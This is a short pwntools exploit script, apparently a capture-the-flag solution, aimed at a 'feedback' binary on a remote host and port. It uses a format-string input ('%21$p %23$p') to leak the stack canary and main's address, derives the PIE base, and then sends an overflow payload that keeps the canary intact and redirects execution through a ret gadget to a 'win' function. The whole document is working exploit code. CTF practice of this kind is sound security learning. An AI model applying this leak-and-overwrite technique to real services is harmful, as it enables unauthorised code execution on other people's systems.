from pwn import *

# p = process('./feedback')
p = remote('61.14.233.78', 7331)

elf = ELF('./feedback', checksec=False)
context.binary = elf
rop = ROP(elf)



p.recvuntil(b'Enter your message: ')
p.sendline(b'%21$p %23$p')  # %21$p: canary, %23$p: địa chỉ main

leak = p.recvline().strip().split()
canary = int(leak[0], 16)
main_addr = int(leak[1], 16)
pie_base = main_addr - 0x131c
win_addr = pie_base + 0x1250
ret_adr = rop.find_gadget(['ret'])[0]
ret = ret_adr + pie_base


print(f"Canary: {hex(canary)}")
print(f"Main addr: {hex(main_addr)}")
print(f"PIE base: {hex(pie_base)}")
print(f"Win addr: {hex(win_addr)}")
print(f"Ret addr: {hex(ret)}")

payload  = b"A" * 120
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret - 18)
payload += p64(win_addr - 18 )


# gdb.attach(p, gdbscript='''
        
#         gdb ./feedback
#         b *main
# ''')

p.recvuntil(b'feedback about my service: ')
p.sendline(payload)

p.interactive()

